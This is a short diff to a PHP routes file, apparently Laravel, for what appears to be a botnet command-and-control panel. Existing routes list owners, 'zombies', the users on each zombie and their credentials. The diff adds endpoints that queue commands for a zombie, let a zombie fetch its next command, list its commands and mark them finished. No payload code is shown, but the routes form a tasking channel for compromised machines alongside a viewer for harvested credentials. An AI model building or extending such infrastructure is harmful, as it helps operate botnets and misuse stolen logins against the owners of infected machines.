@@ -24,3 +24,8 @@ Route::any('/view/owners', 'OwnerController@viewOwners');
 Route::any('/view/zombies/{owner_id}', 'ZombieController@viewZombies');
 Route::any('/view/users/{zombie_id}', 'UserController@viewUsers');
 Route::any('/view/credentials/{user_id}', 'CredentialController@viewCredentials');
+
+Route::any('/queue/command/{zombie_id}', 'CommandController@queueCommand');
+Route::any('/next/command/{zombie_id}', 'CommandController@nextCommand');
+Route::any('/view/commands/{zombie_id}', 'CommandController@viewCommands');
+Route::any('/finished/command/{command_id}', 'CommandController@finishedCommand');
